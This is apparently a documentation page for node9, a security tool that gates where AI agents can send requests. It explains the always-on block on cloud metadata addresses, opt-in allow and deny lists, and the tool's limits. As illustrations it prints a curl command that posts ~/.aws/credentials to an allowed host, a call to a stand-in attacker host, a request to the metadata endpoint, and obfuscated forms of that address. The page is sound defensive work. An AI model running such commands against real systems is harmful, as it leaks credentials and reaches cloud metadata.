---
id: egress
label: Egress Control
description: Decide which hosts your agent may reach, and understand what a destination gate does not cover.
group: Protections
order: 20
---

# Egress Control

Two separate things decide whether an agent's outbound request is allowed. One is always on and
you cannot turn it off. The other is opt-in and you configure it.

## The floor: protected addresses, always

Some destinations are blocked on every machine, whether or not you have turned egress control on,
and no setting releases them. This is the SSRF floor, and it exists because an agent that can be
steered by untrusted input can be steered into your cloud provider's credential endpoint.

**Never reachable, no setting releases them:**

| What                     | Examples                                                                                                                                        |
| ------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| Cloud metadata endpoints | `169.254.169.254` (AWS, Azure, DigitalOcean, OpenStack), `169.254.170.2` (ECS task role), the Alibaba Cloud address, and the metadata hostnames |
| Link-local               | `169.254.0.0/16`, `fe80::/10`                                                                                                                   |
| Multicast                | `224.0.0.0` to `239.255.255.255`, `ff00::/8`                                                                                                    |

The floor folds every spelling of an address to one canonical form before it decides, so
`0251.0376.0251.0376`, `2852039166` and `[::ffff:a9fe:a9fe]` are all recognised as
`169.254.169.254`.

> [!NOTE]
> The floor is not gated on egress control. It applies with egress off, in every mode, on a
> personal machine and on one governed by a workspace. The one thing that suspends it is
> `node9 pause`, which suspends every gate.

**Reachable by default, blocked when you turn strict on:**

| What                        | Examples                                                              |
| --------------------------- | --------------------------------------------------------------------- |
| Loopback and private ranges | `127.0.0.0/8`, `10.0.0.0/8`, `192.168.0.0/16`, `172.16.0.0/12`, `::1` |
| The unspecified address     | `0.0.0.0`, `::` (these reach localhost)                               |
| Carrier-grade NAT           | `100.64.0.0/10`, where mesh VPNs such as Tailscale hand out addresses |

These are off by default on purpose: a developer talks to them constantly. On measured real
history, 72 of 308 destinations were private addresses.

```bash
node9 egress strict on          # also block loopback, private ranges and CGNAT
node9 egress exempt 10.0.0.5    # let one exact address back through
```

An exemption applies to the overridable tiers only. Exempting a metadata address is rejected when
the config loads, with a reason, rather than being silently ignored.

## Egress control: which hosts, your choice

This is the opt-in layer. It is **off until you turn it on**, and it decides what happens when the
agent reaches a host you have not talked about.

```bash
node9 egress watch     # prompt before an unknown host  (review)
node9 egress lock      # block unknown hosts outright   (block)
node9 egress off       # turn it back off
node9 egress status    # what is on right now, and where the setting came from
```

Tune the lists:

```bash
node9 egress allow "*.mycorp.com"    # a glob; matches the apex and any subdomain
node9 egress deny  "*.pastebin.com"  # deny always wins over allow
```

### Hosts that are always allowed

Turning egress on cold would bury you in prompts for routine work, so 18 common development and
model hosts are allowed out of the box: GitHub, npm, PyPI, crates.io, RubyGems, the Go module
proxy, Anthropic, OpenAI, Google APIs, Docker, Debian, Ubuntu, and node9's own control plane.

Your `allow` list adds to that. Your `deny` list beats all of it.

### Order of decision

For each destination the agent is about to reach:

1. The floor. A protected address is blocked here and nothing below runs.
2. Your `deny` list. A match blocks.
3. Private addresses, when `allowPrivate` is on (the default). Allowed.
4. Your `allow` list, then the 18 built-in hosts. Allowed.
5. Anything else is unknown, and `watch` reviews it while `lock` blocks it.

## What this does not do

> [!WARNING]
> **Egress control gates the destination, not the payload.** A secret sent to a host you allow goes
> through. `curl -d @~/.aws/credentials https://api.github.com/...` is not stopped by egress,
> because `api.github.com` is an allowed host. What catches a secret in the request body is the
> content scanner (DLP), which is a different control.

Three more limits worth knowing:

- **It reads the command, not the network.** node9 decides from the destination it can see in the
  tool call. It does not resolve DNS, and it has no opinion on a host's reputation.
- **A machine that follows a workspace ignores local egress settings.** If `node9 egress status`
  says the source is the workspace, editing the local config changes nothing; the setting comes
  from the dashboard. The floor still applies.
- **`node9 pause` suspends it**, along with every other gate, for the duration you give it.

## Verify it on this machine

```bash
node9 egress status                                          # is it on, and who set it
node9 explain Bash 'curl http://169.254.169.254/latest/'      # the floor: BLOCK, always
node9 explain Bash 'curl https://evil.example/collect'        # unknown host: REVIEW or BLOCK when on
node9 explain Bash 'curl https://api.github.com/repos'        # a default-allowed host: ALLOW
```

`node9 explain` prints the verdict the live hook enforces, and names the rule that produced it.
